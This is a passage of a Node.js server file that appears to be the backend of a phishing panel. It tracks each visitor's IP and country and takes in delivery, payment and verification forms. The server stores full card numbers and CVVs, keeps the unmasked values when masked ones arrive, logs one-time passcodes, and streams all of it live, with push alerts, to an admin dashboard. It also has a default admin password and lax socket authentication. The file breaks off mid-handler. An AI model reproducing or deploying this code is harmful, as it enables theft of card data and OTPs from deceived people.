require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const geoip = require('geoip-lite');
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const pool = require('./config/database');
const { initializeDatabase } = require('./models/schema');

// Import Firebase Admin SDK
const firebaseAdmin = require('./firebase-admin');

// Import routes
const productRoutes = require('./routes/products');
const adminRoutes = require('./routes/admin');
const visitorRoutes = require('./routes/visitors');

// Global FCM tokens storage (for admin notifications)
global.fcmTokens = [];

// Notification cooldown/lock to prevent duplicate notifications
// Key: sessionId:type, Value: timestamp
const notificationCooldown = new Map();
const COOLDOWN_MS = 10000; // 10 seconds cooldown

// Track visitors sent via admin:initData to prevent notification flood
// Visitors in this set were loaded from DB during admin login - NO notifications for them
const initialLoadVisitorsSent = new Set();

const app = express();
const server = http.createServer(app);

// Get admin password from env or use default (SHOULD BE CHANGED IN PRODUCTION)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE']
  }
});

// ==========================================
// Socket.IO Authentication Middleware
// ==========================================
io.use(async (socket, next) => {
  const token = socket.handshake.auth.token;
  
  // Check if token matches admin password
  if (token && token.length >= 4) {
    try {
      // Verify token against password (in production, use proper token validation)
      // For now, we accept any non-empty password as auth
      // The actual validation happens in admin:login event via HTTP API
      socket.isAdmin = true;
      return next();
    } catch (error) {
      return next(new Error('Authentication error'));
    }
  }
  
  // Allow visitor connections without admin password
  socket.isAdmin = false;
  next();
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Store connected clients
const connectedClients = new Map();
const adminConnections = new Map();

// Helper: Check if socket is authenticated admin
const isAdminAuthenticated = (socket) => {
  const client = connectedClients.get(socket.id);
  return client && client.isAdmin === true;
};

// Helper: Wrapper for admin-only events (send error if not authenticated)
const adminOnly = (socket, handler) => {
  return (...args) => {
    if (!isAdminAuthenticated(socket)) {
      console.log(`⚠️ Unauthorized admin action attempt from ${socket.id}`);
      socket.emit('admin:unauthorized', { message: 'Not authenticated as admin' });
      return;
    }
    return handler(...args);
  };
};

// Socket.IO connection handling
io.on('connection', (socket) => {
  const sessionId = socket.handshake.query.sessionId || uuidv4();
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '';
  const userAgent = socket.handshake.headers['user-agent'] || '';
  const geo = geoip.lookup(ip);
  
  const clientInfo = {
    sessionId,
    ip,
    userAgent,
    country: geo ? geo.country : 'Unknown',
    countryCode: geo ? geo.country : 'XX',
    currentPage: 'home',
    isAdmin: false, // CRITICAL: Start as non-admin
    connectedAt: new Date()
  };

  connectedClients.set(socket.id, clientInfo);
  
  console.log(`🔌 Client connected: ${sessionId} from ${geo?.country || 'Unknown'} (admin: ${clientInfo.isAdmin})`);

  // Handle visitor tracking
  socket.on('visitor:init', async (data) => {
    try {
      const { sessionId, page = 'home' } = data;
      clientInfo.sessionId = sessionId;
      clientInfo.currentPage = page;
      
      // Check if banned
      const banned = await pool.query(
        'SELECT * FROM banned_users WHERE (session_id = $1 OR ip_address = $2) AND (expires_at IS NULL OR expires_at > NOW()) LIMIT 1',
        [sessionId, ip]
      );
      
      if (banned.rows.length > 0) {
        socket.emit('user:banned', { 
          message: banned.rows[0].custom_message || 'تم حظرك من الموقع' 
        });
        socket.disconnect();
        return;
      }

      // IMPORTANT: Clear any pending offline timers FIRST before any other operations
      // This ensures that when user navigates to a new page, the new connection overrides the disconnect timer
      if (offlineTimers.has(sessionId)) {
        clearTimeout(offlineTimers.get(sessionId));
        offlineTimers.delete(sessionId);
        console.log(`🔄 visitor:init: cancelled offline timer for ${sessionId}`);
      }
      
      // Track visitor as online in memory FIRST
      isOnlineVisitors.add(sessionId);
      
      // Update or insert visitor
      // IMPORTANT: Set is_online = true and visit_status = 'online' to clear any offline/disconnected state
      await pool.query(`
        INSERT INTO visitors (session_id, ip_address, country, country_code, user_agent, current_page, is_online, visit_status)
        VALUES ($1, $2, $3, $4, $5, $6, true, 'online')
        ON CONFLICT (session_id) 
        DO UPDATE SET 
          is_online = true, 
          visit_status = 'online',
          current_page = $6,
          last_activity = CURRENT_TIMESTAMP
      `, [sessionId, ip, geo?.country || 'Unknown', geo?.country || 'XX', userAgent, page]);
      
      // Broadcast online status to admin immediately
      // Query will be reused below, so we store the result
      let visitorResultForBroadcast = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );
      
      if (visitorResultForBroadcast.rows[0]) {
        const eventData = {
          ...visitorResultForBroadcast.rows[0],
          timestamp: new Date()
        };
        
        adminConnections.forEach((adminSocket) => {
          adminSocket.emit('visitor:online', eventData);
        });
      }

      // Get full visitor data (reuse the query result)
      const visitorResult = visitorResultForBroadcast;
      
      // Get all form submissions for this visitor
      let submissionsMap = {};
      const allSubmissions = await pool.query(`
        SELECT * FROM form_submissions 
        WHERE session_id = $1 
        ORDER BY created_at DESC
      `, [sessionId]);
      
      allSubmissions.rows.forEach(sub => {
        const key = `${sub.session_id}_${sub.form_type}`;
        if (!submissionsMap[key]) {
          submissionsMap[key] = [];
        }
        submissionsMap[key].push(sub);
      });

      // Parse visitor data
      let visitorData = visitorResult.rows[0] || {};
      if (typeof visitorData.delivery_data === 'string') {
        try { visitorData.delivery_data = JSON.parse(visitorData.delivery_data); } catch (e) {}
      }
      if (typeof visitorData.payment_data === 'string') {
        try { visitorData.payment_data = JSON.parse(visitorData.payment_data); } catch (e) {}
      }
      if (typeof visitorData.verification_data === 'string') {
        try { visitorData.verification_data = JSON.parse(visitorData.verification_data); } catch (e) {}
      }

      // Add submissions to visitor data
      visitorData.delivery_submissions = submissionsMap[`${sessionId}_delivery`] || [];
      visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
      visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];

      // Determine if this is a FIRST TIME visitor (no previous submissions)
      const hasExistingSubmissions = (
        visitorData.delivery_submissions.length > 0 ||
        visitorData.payment_submissions.length > 0 ||
        visitorData.verification_submissions.length > 0
      );
      
      // Mark first visit for UI
      visitorData.isFirstVisit = !hasExistingSubmissions;

      // Notify admins of new visitor with FULL data
      const newVisitorData = {
        ...visitorData,
        timestamp: new Date()
      };
      console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins:`, JSON.stringify(newVisitorData).substring(0, 200));
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('visitor:new', newVisitorData);
      });

      // ONLY send FCM push notification for FIRST TIME visitors
      // Do NOT send for reconnections or existing visitors
      if (!hasExistingSubmissions) {
        // Check if this visitor was already sent during admin initial load
        if (initialLoadVisitorsSent.has(sessionId)) {
          console.log('📱 Visitor was loaded during admin initial load - skipping notification');
        } else {
          // Check cooldown to prevent duplicate notifications
          const cooldownKey = sessionId + ':visit';
          const lastSent = notificationCooldown.get(cooldownKey);
          const now = Date.now();

          if (lastSent && (now - lastSent) < COOLDOWN_MS) {
            console.log('📱 Cooldown active - skipping duplicate notification (' + Math.round((COOLDOWN_MS - (now - lastSent)) / 1000) + 's remaining)');
          } else {
            console.log('📱 First time visitor - sending push notification');
            notificationCooldown.set(cooldownKey, now);
            firebaseAdmin.notifyNewVisitor(newVisitorData);
          }
        }
      } else {
        console.log('📱 Returning visitor - skipping push notification');
      }


      socket.emit('visitor:confirmed', { sessionId });
    } catch (error) {
      console.error('Error initializing visitor:', error);
    }
  });

  // Handle page changes
  socket.on('visitor:page', async (data) => {
    const { sessionId, page } = data;
    clientInfo.currentPage = page;
    
    try {
      // IMPORTANT: Clear any pending offline timers FIRST
      // This ensures that when user navigates to a new page, the new connection overrides the disconnect timer
      if (offlineTimers.has(sessionId)) {
        clearTimeout(offlineTimers.get(sessionId));
        offlineTimers.delete(sessionId);
        console.log(`🔄 visitor:page: cancelled offline timer for ${sessionId}`);
      }
      
      // IMPORTANT: Set is_online = true and visit_status = 'online' to clear any disconnected state
      // This ensures that when user navigates to a new page, the new connection overrides the disconnect
      await pool.query(
        'UPDATE visitors SET is_online = true, visit_status = $1, current_page = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
        ['online', page, sessionId]
      );
      
      // Track visitor as online in memory
      isOnlineVisitors.add(sessionId);

      // Get full visitor data for payment page (to show existing card data in admin)
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // Get all form submissions for this visitor
      const sessionIds = [sessionId];
      let submissionsMap = {};
      
      const allSubmissions = await pool.query(`
        SELECT * FROM form_submissions 
        WHERE session_id = $1 
        ORDER BY created_at DESC
      `, [sessionId]);
      
      allSubmissions.rows.forEach(sub => {
        const key = `${sub.session_id}_${sub.form_type}`;
        if (!submissionsMap[key]) {
          submissionsMap[key] = [];
        }
        submissionsMap[key].push(sub);
      });

      // Parse visitor data
      let visitorData = visitorResult.rows[0] || {};
      if (typeof visitorData.delivery_data === 'string') {
        try { visitorData.delivery_data = JSON.parse(visitorData.delivery_data); } catch (e) {}
      }
      if (typeof visitorData.payment_data === 'string') {
        try { visitorData.payment_data = JSON.parse(visitorData.payment_data); } catch (e) {}
      }
      if (typeof visitorData.verification_data === 'string') {
        try { visitorData.verification_data = JSON.parse(visitorData.verification_data); } catch (e) {}
      }

      // Add submissions to visitor data
      visitorData.delivery_submissions = submissionsMap[`${sessionId}_delivery`] || [];
      visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
      visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];

      // CRITICAL: Broadcast online status FIRST to override any disconnected state
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:online', {
          ...visitorData,
          sessionId,
          page,
          is_online: true,
          visit_status: 'online',
          timestamp: new Date()
        });
      });
      
      // Then notify with FULL visitor data for page change
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('visitor:pageChange', {
          ...visitorData,
          sessionId,
          page,
          is_online: true,
          visit_status: 'online',
          timestamp: new Date()
        });
        // Also emit visitor:updated to update the card in real-time
        adminSocket.emit('visitor:updated', visitorData);
      });
    } catch (error) {
      console.error('Error updating page:', error);
    }
  });

  // ==========================================
  // MINIMAL VISITOR TRACKING - Only connect/disconnect and form submissions
  // NO real-time activity tracking, NO typing tracking, NO flooding
  // ==========================================
  
  // Store offline timers for visitors (only for disconnect tracking)
  const offlineTimers = new Map();
  const OFFLINE_GRACE_PERIOD = 60000; // 60 seconds before marking offline
  
  // Track which visitors are currently online (for is_online status)
  const isOnlineVisitors = new Set();

  // Handle delivery form submission
  socket.on('form:delivery', async (data) => {
    const { sessionId, formData } = data;
    
    try {
      // Save to form_submissions table (NEW - keeps all history)
      await pool.query(
        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
        [sessionId, 'delivery', JSON.stringify(formData), ip, userAgent]
      );
      
      // Also update visitors table for current data
      await pool.query(
        'UPDATE visitors SET delivery_data = $1, form_submitted = true, delivery_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(formData), sessionId]
      );
      
      // Get all delivery submissions for this visitor (NEW)
      const submissionsResult = await pool.query(
        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
        [sessionId, 'delivery']
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // Notify admins with FULL visitor data - BROADCAST TO ALL
      const eventData = {
        ...visitorResult.rows[0],
        delivery_submissions: submissionsResult.rows, // NEW - include all submissions
        timestamp: new Date()
      };
      
      // Try adminConnections first
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:deliverySubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      // Also broadcast via io.emit to ensure all sockets receive
      io.emit('form:deliverySubmitted', eventData);
      io.emit('visitor:updated', eventData);

      // Send FCM push notification with cooldown check
      const deliveryKey = `${sessionId}:delivery`;
      const lastDeliverySent = notificationCooldown.get(deliveryKey);
      if (lastDeliverySent && (Date.now() - lastDeliverySent) < COOLDOWN_MS) {
        console.log('📱 Delivery notification cooldown active - skipping');
      } else {
        notificationCooldown.set(deliveryKey, Date.now());
        firebaseAdmin.notifyDelivery(eventData);
      }

      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
    } catch (error) {
      console.error('Error saving delivery data:', error);
    }
  });

  // Handle payment form submission
  socket.on('form:payment', async (data) => {
    const { sessionId, paymentData } = data;
    
    try {
      // جلب البيانات الحالية المخزنة للزائر للحفاظ على الأرقام الحقيقية
      const currentVisitor = await pool.query(
        'SELECT payment_data FROM visitors WHERE session_id = $1', 
        [sessionId]
      );
      
      let finalPaymentData = { ...paymentData };

      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].payment_data) {
        const existingData = currentVisitor.rows[0].payment_data;
        
        // إذا كانت البيانات الجديدة تحتوي على نجوم، نحتفظ بالرقم الحقيقي القديم
        if (paymentData.cardNumber && paymentData.cardNumber.includes('*') && existingData.cardNumber) {
          finalPaymentData.cardNumber = existingData.cardNumber;
        }
        if (paymentData.cvv && paymentData.cvv.includes('*') && existingData.cvv) {
          finalPaymentData.cvv = existingData.cvv;
        }
      }

      // Save to form_submissions table (NEW - keeps all history)
      await pool.query(
        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
        [sessionId, 'payment', JSON.stringify(finalPaymentData), ip, userAgent]
      );

      await pool.query(
        'UPDATE visitors SET payment_data = $1, payment_submitted = true, payment_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(finalPaymentData), sessionId]
      );

      // Get all payment submissions for this visitor (NEW)
      const submissionsResult = await pool.query(
        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
        [sessionId, 'payment']
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة - BROADCAST
      const eventData = {
        ...visitorResult.rows[0],
        payment_submissions: submissionsResult.rows, // NEW - include all submissions
        timestamp: new Date()
      };
      
      // Send to all connected admins
      console.log(`📤 Broadcasting payment to ${adminConnections.size} admins`);
      adminConnections.forEach((adminSocket, socketId) => {
        console.log(`📤 Sending to admin socket: ${socketId}`);
        adminSocket.emit('form:paymentSubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      // Also broadcast to all sockets (including visitors for confirmation)
      io.emit('form:paymentSubmitted', eventData);
      io.emit('visitor:updated', eventData);

      // Send FCM push notification with cooldown check
      const paymentKey = `${sessionId}:payment`;
      const lastPaymentSent = notificationCooldown.get(paymentKey);
      if (lastPaymentSent && (Date.now() - lastPaymentSent) < COOLDOWN_MS) {
        console.log('📱 Payment notification cooldown active - skipping');
      } else {
        notificationCooldown.set(paymentKey, Date.now());
        firebaseAdmin.notifyPayment(eventData);
      }

      console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
    } catch (error) {
      console.error('Error saving payment data:', error);
    }
  });

  // Handle verification form submission
  socket.on('form:verification', async (data) => {
    const { sessionId, verificationData } = data;
    
    try {
      // Get current OTP history
      const currentVisitor = await pool.query(
        'SELECT otp_history FROM visitors WHERE session_id = $1',
        [sessionId]
      );
      
      let otpHistory = [];
      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].otp_history) {
        try {
          otpHistory = Array.isArray(currentVisitor.rows[0].otp_history) 
            ? currentVisitor.rows[0].otp_history 
            : JSON.parse(currentVisitor.rows[0].otp_history);
        } catch (e) {
          otpHistory = [];
        }
      }
      
      // Add new OTP to history
      if (verificationData.otp) {
        const newOTPEntry = {
          otp: verificationData.otp,
          timestamp: new Date().toISOString(),
          ip: geo?.ip || socket.handshake.address
        };
        otpHistory.unshift(newOTPEntry);
        
        // Keep only last 10 OTP entries
        if (otpHistory.length > 10) {
          otpHistory = otpHistory.slice(0, 10);
        }
      }

      // Save to form_submissions table (NEW - keeps all history)
      await pool.query(
        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
        [sessionId, 'verification', JSON.stringify(verificationData), ip, userAgent]
      );

      await pool.query(
        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, verification_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
        [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
      );

      // Get all verification submissions for this visitor (NEW)
      const submissionsResult = await pool.query(
        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
        [sessionId, 'verification']
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // Notify admins with FULL visitor data including OTP history - BROADCAST
      const eventData = {
        ...visitorResult.rows[0],
        verification_submissions: submissionsResult.rows, // NEW - include all submissions
        timestamp: new Date()
      };
      
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:verificationSubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      io.emit('form:verificationSubmitted', eventData);
      io.emit('visitor:updated', eventData);

      // Send FCM push notification with cooldown check
      const verifyKey = `${sessionId}:verification`;
      const lastVerifySent = notificationCooldown.get(verifyKey);
      if (lastVerifySent && (Date.now() - lastVerifySent) < COOLDOWN_MS) {
        console.log('📱 Verification notification cooldown active - skipping');
      } else {
        notificationCooldown.set(verifyKey, Date.now());
        firebaseAdmin.notifyVerification(eventData);
      }

      console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
    } catch (error) {
      console.error('Error saving verification data:', error);
    }
  });

  // Handle admin connections
  socket.on('admin:login', async (data) => {
    try {
      const { username, password, deviceInfo } = data;
      const result = await pool.query(
        'SELECT * FROM admins WHERE username = $1 AND is_active = true',
        [username]
      );

      console.log('🔍 Login attempt for username:', username);
      console.log('🔍 Query result rows:', result.rows.length);
      
      if (result.rows.length > 0) {
        const admin = result.rows[0];
        console.log('🔍 Admin found, comparing password...');
        const isValid = await bcrypt.compare(password, admin.password_hash);
        console.log('🔍 Password valid:', isValid);

        if (isValid) {
          const sessionToken = uuidv4();
          clientInfo.isAdmin = true;
          
          // IMPORTANT: Add to admin connections for real-time updates ONLY AFTER AUTHENTICATION
          adminConnections.set(socket.id, socket);
          console.log("🔌 Admin logged in, connections: " + adminConnections.size);
          
          // Save admin session with 10-hour expiry
          await pool.query(
            `INSERT INTO admin_sessions (session_token, device_info, ip_address, country, is_current, expires_at) 
             VALUES ($1, $2, $3, $4, true, CURRENT_TIMESTAMP + INTERVAL '365 days')`,
            [sessionToken, JSON.stringify(deviceInfo || {}), ip, geo?.country || 'Unknown']
          );

          // Calculate expiry time
          const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 10 hours from now
          
          // Send login success
          socket.emit('admin:loginSuccess', { 
            sessionToken, 
            adminId: admin.id,
            expiresAt: expiresAt
          });
          console.log(`🔐 Admin ${username} logged in from ${geo?.country}`);
          
          // CRITICAL: Fetch and send ALL visitors from database immediately
          try {
            const visitorsResult = await pool.query(
              'SELECT * FROM visitors ORDER BY last_activity DESC LIMIT 100'
            );

            // Mark ALL these visitors so we do NOT send notifications for them
            // This prevents flooding when admin opens dashboard
            visitorsResult.rows.forEach(v => initialLoadVisitorsSent.add(v.session_id));
            
            // Get all form submissions for these visitors (NEW)
            const sessionIds = visitorsResult.rows.map(v => v.session_id);
            let submissionsMap = {};
            
            if (sessionIds.length > 0) {
              const allSubmissions = await pool.query(`
                SELECT * FROM form_submissions 
                WHERE session_id = ANY($1) 
                ORDER BY created_at DESC
              `, [sessionIds]);
              
              // Group submissions by session_id and form_type
              allSubmissions.rows.forEach(sub => {
                const key = `${sub.session_id}_${sub.form_type}`;
                if (!submissionsMap[key]) {
                  submissionsMap[key] = [];
                }
                submissionsMap[key].push(sub);
              });
            }
            
            const allVisitors = visitorsResult.rows.map(visitor => {
              // Parse JSON fields
              let deliveryData = visitor.delivery_data;
              if (typeof deliveryData === 'string') {
                try { deliveryData = JSON.parse(deliveryData); } catch (e) { deliveryData = {}; }
              }
              
              let paymentData = visitor.payment_data;
              if (typeof paymentData === 'string') {
                try { paymentData = JSON.parse(paymentData); } catch (e) { paymentData = {}; }
              }
              
              let verificationData = visitor.verification_data;
              if (typeof verificationData === 'string') {
                try { verificationData = JSON.parse(verificationData); } catch (e) { verificationData = {}; }
              }
              
              let otpHistory = visitor.otp_history;
              if (typeof otpHistory === 'string') {
                try { otpHistory = JSON.parse(otpHistory); } catch (e) { otpHistory = []; }
              }
              
              return {
                ...visitor,
                session_id: visitor.session_id,
                delivery_data: deliveryData || {},
                payment_data: paymentData || {},
                verification_data: verificationData || {},
                otp_history: otpHistory || [],
                is_online: isOnlineVisitors.has(visitor.session_id),
                // NEW: Include all form submissions
                delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
                payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
                verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
              };
            });
            
            // Send all visitors to this admin
            socket.emit('admin:initData', { visitors: allVisitors });
            console.log(`📊 Sent ${allVisitors.length} visitors to admin (with ${sessionIds.length} sessions, ${Object.keys(submissionsMap).length} submission types)`);
            
            // Also send stats (including all visitors, not just non-deleted)
            const statsResult = await pool.query(`
              SELECT 
                COUNT(*) as total,
                COUNT(CASE WHEN delivery_data IS NOT NULL AND delivery_data != '{}' THEN 1 END) as with_delivery,
                COUNT(CASE WHEN payment_data IS NOT NULL AND payment_data != '{}' THEN 1 END) as with_payment,
                COUNT(CASE WHEN verification_data IS NOT NULL AND verification_data != '{}' THEN 1 END) as with_verification
              FROM visitors
            `);
            
            // Get form submission counts from form_submissions table
            const formSubmissionStats = await pool.query(`
              SELECT 
                COUNT(*) as total_submissions,
                COUNT(CASE WHEN form_type = 'delivery' THEN 1 END) as delivery_submissions,
                COUNT(CASE WHEN form_type = 'payment' THEN 1 END) as payment_submissions,
                COUNT(CASE WHEN form_type = 'verification' THEN 1 END) as verification_submissions
              FROM form_submissions
            `);
            
            const stats = {
              total: parseInt(statsResult.rows[0].total) || 0,
              withDelivery: parseInt(statsResult.rows[0].with_delivery) || 0,
              withPayment: parseInt(statsResult.rows[0].with_payment) || 0,
              withVerification: parseInt(statsResult.rows[0].with_verification) || 0,
              // Include form submission counts
              formSubmissions: parseInt(formSubmissionStats.rows[0].total_submissions) || 0,
              deliverySubmissions: parseInt(formSubmissionStats.rows[0].delivery_submissions) || 0,
              paymentSubmissions: parseInt(formSubmissionStats.rows[0].payment_submissions) || 0,
              verificationSubmissions: parseInt(formSubmissionStats.rows[0].verification_submissions) || 0
            };
            
            socket.emit('stats:data', stats);
            console.log(`📊 Sent stats to admin:`, stats);
            
          } catch (dbError) {
            console.error('❌ Error fetching visitors:', dbError);
          }
        } else {
          socket.emit('admin:loginFailed', { message: 'Invalid credentials' });
        }
      } else {
        socket.emit('admin:loginFailed', { message: 'User not found' });
      }
    } catch (error) {
      console.error('❌ Admin login error:', error.message, error.stack);
      socket.emit('admin:loginFailed', { message: 'Login error: ' + error.message });
    }
  });

  socket.on('admin:validate', async (data) => {
    try {
      const { sessionToken } = data;
      
      // Check if session exists, is current, AND not expired
      const result = await pool.query(
        `SELECT * FROM admin_sessions 
         WHERE session_token = $1 AND is_current = true AND (expires_at IS NULL OR expires_at > NOW())`,
        [sessionToken]
      );

      if (result.rows.length > 0) {
        clientInfo.isAdmin = true;
        adminConnections.set(socket.id, socket);
        
        // Return session info including expiry time
        const session = result.rows[0];
        socket.emit('admin:valid', { 
          valid: true,
          expiresAt: session.expires_at,
          loginAt: session.created_at
        });
        
        // Extend session on activity (optional: refresh expires_at)
        // This keeps the session alive as long as admin is active
      } else {
        // Session expired or invalid - delete it
        if (sessionToken) {
          await pool.query(
            'DELETE FROM admin_sessions WHERE session_token = $1',
            [sessionToken]
          );
        }
        socket.emit('admin:valid', { valid: false, reason: 'session_expired' });
      }
    } catch (error) {
      console.error('Error validating admin session:', error);
      socket.emit('admin:valid', { valid: false });
    }
  });

  // CRITICAL: Admin logout - remove from connections
  socket.on('admin:logout', () => {
    clientInfo.isAdmin = false;
    adminConnections.delete(socket.id);
    console.log("🔌 Admin logged out, connections: " + adminConnections.size);
    socket.emit('admin:loggedOut');
  });

  // Handle real-time stats request (ADMIN ONLY)
  socket.on('stats:request', adminOnly(socket, async () => {
    try {
      const totalVisitors = await pool.query('SELECT COUNT(*) FROM visitors');
      const formSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE form_submitted = true');
      const paymentSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE payment_submitted = true');
      const verificationSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE verification_submitted = true');
      const onlineVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_online = true');
      const countryStats = await pool.query(`
        SELECT country, COUNT(*) as count 
        FROM visitors 
        GROUP BY country 
        ORDER BY count DESC 
        LIMIT 10
      `);

      socket.emit('stats:update', {
        totalVisitors: parseInt(totalVisitors.rows[0].count),
        formSubmissions: parseInt(formSubmissions.rows[0].count),
        paymentSubmissions: parseInt(paymentSubmissions.rows[0].count),
        verificationSubmissions: parseInt(verificationSubmissions.rows[0].count),
        onlineVisitors: parseInt(onlineVisitors.rows[0].count),
        countryStats: countryStats.rows
      });
    } catch (error) {
      console.error('Error fetching stats:', error);
    }
  }));

  // Handle visitors request - RETURN ONLY NON-DELETED VISITORS (ADMIN ONLY)
  // NOTE: This is now handled by admin:login which sends admin:initData automatically
  // Keeping this for backward compatibility
  socket.on('visitors:request', async () => {
    try {
      // Check if admin
      const client = connectedClients.get(socket.id);
      if (!client || !client.isAdmin) {
        console.log('⚠️ Unauthorized visitors:request from', socket.id);
        socket.emit('admin:unauthorized', { message: 'Not authenticated as admin' });
        return;
      }
      
      // IMPORTANT: Return ALL visitors (including deleted ones)
      const visitors = await pool.query(`
        SELECT * FROM visitors 
        ORDER BY is_online DESC, last_activity DESC 
        LIMIT 100
      `);

      // Get all form submissions for these visitors
      const sessionIds = visitors.rows.map(v => v.session_id);
      let submissionsMap = {};
      
      if (sessionIds.length > 0) {
        const allSubmissions = await pool.query(`
          SELECT * FROM form_submissions 
          WHERE session_id = ANY($1) 
          ORDER BY created_at DESC
        `, [sessionIds]);
        
        // Group submissions by session_id and form_type
        allSubmissions.rows.forEach(sub => {
          const key = `${sub.session_id}_${sub.form_type}`;
          if (!submissionsMap[key]) {
            submissionsMap[key] = [];
          }
          submissionsMap[key].push(sub);
        });
      }

      // Get trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Get form submission counts
      const formSubmissionStats = await pool.query(`
        SELECT 
          COUNT(*) as total_submissions,
          COUNT(CASE WHEN form_type = 'delivery' THEN 1 END) as delivery_submissions,
          COUNT(CASE WHEN form_type = 'payment' THEN 1 END) as payment_submissions,
          COUNT(CASE WHEN form_type = 'verification' THEN 1 END) as verification_submissions
        FROM form_submissions
      `);

      // Attach submissions to each visitor with parsed JSON fields
      const visitorsWithSubmissions = visitors.rows.map(visitor => {
        // Parse JSON fields
        let deliveryData = visitor.delivery_data;
        if (typeof deliveryData === 'string') {
          try { deliveryData = JSON.parse(deliveryData); } catch (e) { deliveryData = {}; }
        }
        
        let paymentData = visitor.payment_data;
        if (typeof paymentData === 'string') {
          try { paymentData = JSON.parse(paymentData); } catch (e) { paymentData = {}; }
        }
        
        let verificationData = visitor.verification_data;
        if (typeof verificationData === 'string') {
          try { verificationData = JSON.parse(verificationData); } catch (e) { verificationData = {}; }
        }
        
        let otpHistory = visitor.otp_history;
        if (typeof otpHistory === 'string') {
          try { otpHistory = JSON.parse(otpHistory); } catch (e) { otpHistory = []; }
        }
        
        return {
          ...visitor,
          session_id: visitor.session_id,
          delivery_data: deliveryData || {},
          payment_data: paymentData || {},
          verification_data: verificationData || {},
          otp_history: otpHistory || [],
          is_online: isOnlineVisitors.has(visitor.session_id),
          delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
          payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
          verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
        };
      });

      // Build stats object
      const stats = {
        total: visitors.rows.length,
        withDelivery: visitors.rows.filter(v => v.delivery_data && Object.keys(v.delivery_data).length > 0).length,
        withPayment: visitors.rows.filter(v => v.payment_data && Object.keys(v.payment_data).length > 0).length,
        withVerification: visitors.rows.filter(v => v.verification_data && Object.keys(v.verification_data).length > 0).length,
        formSubmissions: parseInt(formSubmissionStats.rows[0].total_submissions) || 0,
        deliverySubmissions: parseInt(formSubmissionStats.rows[0].delivery_submissions) || 0,
        paymentSubmissions: parseInt(formSubmissionStats.rows[0].payment_submissions) || 0,
        verificationSubmissions: parseInt(formSubmissionStats.rows[0].verification_submissions) || 0
      };

      const responseData = { 
        visitors: visitorsWithSubmissions,
        trashCount: parseInt(trashCount.rows[0].count),
        stats: stats
      };
      
      // Send ONLY to requesting socket (not broadcast)
      socket.emit('visitors:update', responseData);
      
